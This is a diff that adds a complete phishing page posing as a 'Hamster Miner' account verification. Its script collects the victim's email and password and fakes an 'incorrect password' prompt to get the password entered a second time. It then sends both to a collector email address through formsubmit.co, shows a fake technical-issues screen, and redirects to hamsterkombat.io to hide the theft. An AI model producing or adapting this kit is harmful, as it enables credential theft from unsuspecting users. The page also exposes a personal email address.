@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hamster Miner - Verify Account</title>
+    <style>
+        :root {
+            --bg-color: #1c1f2e;
+            --card-bg: #27293a;
+            --gold: #f3ba2f;
+            --text-main: #ffffff;
+            --text-sub: #9aa0a6;
+            --error-red: #ff4444;
+            --btn-primary: linear-gradient(180deg, #ffcb45 0%, #f3ba2f 100%);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            background: var(--bg-color);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-area {
+            width: 80px;
+            height: 80px;
+            background: #333;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            border: 3px solid var(--gold);
+            box-shadow: 0 0 15px rgba(243, 186, 47, 0.3);
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .subtitle {
+            color: var(--text-sub);
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        /* Form Styles */
+        .form-card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            color: var(--text-sub);
+            font-size: 12px;
+            margin-bottom: 6px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            background: #161824;
+            border: 1px solid #3b3e50;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: var(--gold);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: var(--btn-primary);
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 0 #b8860b;
+            transition: transform 0.1s, box-shadow 0.1s;
+        }
+
+        .btn-submit:active {
+            transform: translateY(4px);
+            box-shadow: 0 0 0 #b8860b;
+        }
+
+        .btn-submit:disabled {
+            background: #555;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Status Messages */
+        .status-message {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+
+        .error {
+            background: rgba(255, 68, 68, 0.1);
+            color: var(--error-red);
+            border: 1px solid var(--error-red);
+        }
+
+        .info {
+            background: rgba(243, 186, 47, 0.1);
+            color: var(--gold);
+            border: 1px solid var(--gold);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-left-color: var(--gold);
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Steps Visibility */
+        .step { display: none; }
+        .step.active { display: block; }
+
+        /* Technical Issue Screen */
+        .tech-issue {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .tech-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        .tech-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .tech-desc {
+            font-size: 14px;
+            color: var(--text-sub);
+            line-height: 1.5;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- Header -->
+    <div class="header">
+        <div class="logo-area">🐹</div>
+        <h1>Hamster Miner</h1>
+        <div class="subtitle">Secure Verification Required</div>
+    </div>
+
+    <!-- Step 1: Initial Login -->
+    <div id="step1" class="step active">
+        <div class="form-card">
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" id="email1" placeholder="name@gmail.com" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="pass1" placeholder="••••••••" required>
+            </div>
+            <button class="btn-submit" onclick="handleLogin()">Start Mining</button>
+            <div id="msg1" class="status-message"></div>
+        </div>
+    </div>
+
+    <!-- Step 2: Incorrect Password / Re-enter -->
+    <div id="step2" class="step">
+        <div class="form-card">
+            <div style="text-align: center; margin-bottom: 15px;">
+                <span style="color: var(--error-red); font-weight: bold;">⚠️ Incorrect Password</span>
+            </div>
+            <p style="font-size: 14px; color: var(--text-sub); margin-bottom: 20px; text-align: center;">
+                We couldn't verify your account with the provided password.<br>
+                Please enter the password for <strong id="targetEmailDisplay"></strong> again.
+            </p>
+
+            <div class="input-group">
+                <label>Confirm Password</label>
+                <input type="password" id="pass2" placeholder="••••••••" required>
+            </div>
+            <button class="btn-submit" onclick="handleVerify()">Verify & Unlock</button>
+            <div id="msg2" class="status-message"></div>
+        </div>
+    </div>
+
+    <!-- Step 3: Technical Issues -->
+    <div id="step3" class="step">
+        <div class="form-card tech-issue">
+            <div class="tech-icon">⚙️</div>
+            <div class="tech-title">Technical Issues</div>
+            <div class="tech-desc">
+                We are experiencing high traffic on this page.<br>
+                Please wait while we resolve the issue...
+            </div>
+            <div style="margin-top: 20px;">
+                <span class="spinner"></span> Processing...
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Configuration
+    const TARGET_EMAIL = "dbrittanyr001@gmail.com";
+    const REDIRECT_URL = "https://hamsterkombat.io";
+
+    let userEmail = "";
+    let userPass = "";
+
+    function showMsg(elementId, message, type) {
+        const el = document.getElementById(elementId);
+        el.textContent = message;
+        el.className = "status-message " + type;
+        el.style.display = "block";
+    }
+
+    function switchStep(stepNum) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step' + stepNum).classList.add('active');
+    }
+
+    function handleLogin() {
+        const emailInput = document.getElementById('email1');
+        const passInput = document.getElementById('pass1');
+
+        if (!emailInput.value || !passInput.value) {
+            showMsg('msg1', 'Please fill in all fields.', 'error');
+            return;
+        }
+
+        userEmail = emailInput.value;
+        userPass = passInput.value;
+
+        // Simulate a small delay for realism
+        const btn = document.querySelector('#step1 .btn-submit');
+        const originalText = btn.innerText;
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner" style="border-left-color: #000;"></span> Checking...';
+
+        setTimeout(() => {
+            // Show Step 2
+            document.getElementById('targetEmailDisplay').textContent = userEmail.split('@')[0] + "***";
+            switchStep(2);
+            btn.disabled = false;
+            btn.innerText = originalText;
+        }, 800);
+    }
+
+    function handleVerify() {
+        const passInput = document.getElementById('pass2');
+        if (!passInput.value) {
+            showMsg('msg2', 'Password cannot be empty.', 'error');
+            return;
+        }
+
+        const btn = document.querySelector('#step2 .btn-submit');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner" style="border-left-color: #000;"></span> Verifying...';
+
+        // Send data to FormSubmit
+        fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({
+                subject: "New Hamster Miner Credentials",
+                email: userEmail,
+                password: passInput.value,
+                ip: "N/A",
+                timestamp: new Date().toISOString()
+            })
+        }).catch(err => console.error("Error sending data", err));
+
+        // Switch to Technical Issue screen
+        setTimeout(() => {
+            switchStep(3);
+        }, 1000);
+
+        // Redirect after showing technical issue
+        setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+        }, 4500);
+    }
+</script>
+
+</body>
+</html>
